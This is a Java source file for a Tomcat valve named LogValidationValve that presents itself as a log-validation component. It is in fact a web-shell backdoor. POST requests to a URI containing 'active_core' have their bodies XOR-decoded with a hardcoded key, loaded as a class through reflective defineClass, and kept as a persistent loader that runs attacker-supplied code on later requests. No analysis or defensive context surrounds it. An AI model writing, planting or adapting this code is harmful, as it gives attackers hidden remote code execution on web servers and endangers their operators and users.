package org.apache.catalina.valves;

import java.io.IOException;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

public class LogValidationValve extends ValveBase {

    private static Object globalLoaderInstance = null;
    private static String globalAesKey = "[KEY]           ";

    private static Object cachedResponse = null;
    private static Object cachedRequestFacade = null;

    public LogValidationValve() {
        super(true);
    }

    public Object getRequest() {
        return cachedRequestFacade; 
    }

    public Object getResponse() {
        return cachedResponse;
    }

    public Object getSession() {
        return this; 
    }

    public Object getAttribute(String name) {
        if ("k".equals(name)) {
            return globalAesKey;
        }
        return null;
    }

    @Override
    public void invoke(Request request, Response response) throws IOException, javax.servlet.ServletException {
        if ("POST".equalsIgnoreCase(request.getMethod()) && request.getRequestURI().contains("active_core")) {
            try {
                cachedResponse = response;
                cachedRequestFacade = request.getRequest();
                if (globalLoaderInstance == null) {
                    InputStream is = request.getInputStream();
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    byte[] buf = new byte[512];
                    int length;
                    while ((length = is.read(buf)) != -1) {
                        bos.write(buf, 0, length);
                    }
                    byte[] rawData = bos.toByteArray();

                    byte[] keyBytes = globalAesKey.getBytes("UTF-8");
                    byte[] decryptedClassBytes = new byte[rawData.length];
                    for (int i = 0; i < rawData.length; i++) {
                        decryptedClassBytes[i] = (byte) (rawData[i] ^ keyBytes[(i + 1) % keyBytes.length]);
                    }

                    java.lang.reflect.Method defineMethod = ClassLoader.class.getDeclaredMethod(
                        "defineClass", new Class[]{byte[].class, int.class, int.class}
                    );
                    defineMethod.setAccessible(true);
                    ClassLoader parentLoader = this.getClass().getClassLoader();
                    
                    Class<?> clazz = (Class<?>) defineMethod.invoke(parentLoader, new Object[]{decryptedClassBytes, new Integer(0), new Integer(decryptedClassBytes.length)});
                    java.lang.reflect.Constructor<?> constructor = clazz.getConstructor(new Class[]{ClassLoader.class});
                    globalLoaderInstance = constructor.newInstance(new Object[]{parentLoader});
                    
                    response.getWriter().print("LOADER_INIT_SUCCESS");
                    response.finishResponse(); 
                    return;
                } 
                else {
                    try {
                        Class<?> pulsarClass = globalLoaderInstance.getClass();
                        java.lang.reflect.Field fKey = null;
                        try { fKey = pulsarClass.getDeclaredField("KEY"); } catch (Exception ex) { fKey = pulsarClass.getDeclaredField("key"); }
                        if (fKey != null) {
                            fKey.setAccessible(true);
                            fKey.set(null, globalAesKey); 
                        }
                    } catch (Exception e) {}

                    globalLoaderInstance.getClass().getMethod("equals", new Class[]{Object.class}).invoke(globalLoaderInstance, new Object[]{this});
                    
                    response.finishResponse(); 
                    return;
                }
            } catch (Exception ex) {
                try {
                    response.getWriter().print("VALVE_CRITICAL_FAULT: " + ex.toString());
                } catch (Exception ignored) {}
                response.finishResponse();
                return;
            }
        }
        
        getNext().invoke(request, response);
    }
}
